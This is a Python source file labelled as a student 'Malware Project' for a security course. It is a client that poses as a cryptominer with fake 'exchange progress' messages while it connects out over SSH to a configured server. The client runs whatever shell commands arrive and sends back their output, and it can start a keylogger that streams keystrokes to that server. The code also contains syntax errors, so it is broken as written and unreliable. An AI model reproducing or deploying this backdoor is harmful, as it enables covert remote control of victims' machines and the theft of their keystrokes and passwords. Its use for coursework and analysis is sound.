#!/usr/bin/env python
#utf-8
#==============================================================================
#   Assignment:  Malware Project
#
#       Author:  Darien, Alexi
#     Language:  Python3
#   To Compile:  N/A, Python is not a compiled language
#
#         Class:  DPI 912
#       Professor:  Harvey Kaduri
#     Due Date:: April 17h, 2020 - 5:00 pm
#   Submitted:  April 17th, 2020 - 4:50 pm
#
#-----------------------------------------------------------------------------
#
#  Description:  A reverse port forwarded server, capable of keylogging and back door access to shell.
#
#        Input:  N/A
#
#       Output:  N/A
#
#    Algorithm:  When run, the client will postpone, but eventually create a reverse port forwarded server from within most firewalls. This will connect back to a central server, where
#       keystrokes will be logged and recorded.
#
#   Required Features Not Included:  N/A
#
#   Known Bugs:  N/A
#
#   Classification: Client
#
#==============================================================================

import sys
import paramiko
import subprocess
import random
from os import system
from loguru import logger
import config as config

from pynput.keyboard import Key, Listener

#script args
server_address = config.host
server_port = int(config.port)
username = config.user
password = config.code
progress = 0

logger.add(sys.stderr,
           format="{time} {message}",
           filter="client",
           level="INFO")

logger.add('logs/log_{time:YYYY-MM-DD}.log',
           format="{time} {level} {message}",
           filter="client",
           level="ERROR")

def init():
    system(f'clear')
    logger.info("""



 = = = = = = = = = = = = = = = = = = = = = = = = = WELCOME = = = = = = = = = = = = = = = = = = = = = = = = = =
This is a SSH-Enabled cryptominer application for privatized use. Created for use of automated personal crypto coin profit mining. The application will start, a client will initialize, and proceed to connect to an SSH server to continue processing. This process will begin without further input being required. Sit back, relax, and profit.

""")
    logger.warning('\n\nCryptomining can be very hardware intensive, especially for GPUs. Ensure your hardware and drivers are up to date if you encounter any issues, or contact our support staff if you think there may be a bug.\n')
    logger.info('\nStarting SSH-enabled client cryptominer . . .')

init()



#connect to the remote ssh server and recieve commands to be #executed and send back output
def parent(server_address, server_port, username, password):
    logger.info('Miner started successfully!')
    logger.info(f"You are: {server_address}:{server_port} - {username}@{password}")
    # instantiate the ssh client
    client = paramiko.SSHClient()
    # auto add key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # connect to ssh server
    logger.info('Attempting to connect with exchange server . . .')
    client.connect(
        server_address,
        port=server_port,
        username=username,
        password=password
    )
    logger.info('Connected to exchange server.')
    # get ssh session
    client_session = client.get_transport().open_session()
    if client_session.active and not client_session.closed:
        # wait for command, execute and send result ouput
        while True:
            try:
                global progress
                command = client_session.recv(1024).decode('utf-8')
                if (progress >= 100):
                    logger.info('Exchange successful!')
                    progress = -500
                elif (progress <=-10)
                    progress = progress + random.randint(0, 3)
                elif (progress >= 0 && progress < 100):
                    progress = progress + random.randint(0, 3)
                    logger.info(f'Exchange progress: {progress}')
                else:
                    logger.info('Processing exchange . . .')
                    progress = 0
                
                # Event for recording key presses
                def on_press(key):
                    client_session.send('"{0} pressed"'.format(key))
                    if command == "exit":
                        return False
           
                # You could add more hard-coded triggers here, anything undefined is treated as a command to the client's cli
                if (command == "process" || command == "exit"):
                    # Collect events until released
                    with Listener(
                        on_press=on_press) as listener:
                            listener.join()
                else:
                    command_output = subprocess.run(
                        command, stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        shell=True,
                        timeout=30 # Client will quit if server connection isn't found after this many seconds
                    )
                # send back the resulting output
                if len(command_output.stderr.decode('utf-8')): # STDERR
                    client_session.send(command_output.stderr.decode('utf-8'))
                elif len(command_output.stdout.decode('utf-8')): # STDIN
                    client_session.send(command_output.stdout.decode('utf-8'))
                else: # STDUNK
                    client_session.send('null')
            except subprocess.CalledProcessError as err:
                client_session.send(str(err))
    client_session.close()
    return
try:
    parent(server_address, server_port, username, password)
except Exception as err:
    logger.error(err)
    logger.warning("Application unexpectedly needs to exit.\nSorry about that, try checking your internet connection, or checking back later, as the exchange servers may be temporarily down. SSH keys can also sometimes cause the tunnel to fail and collapse.")
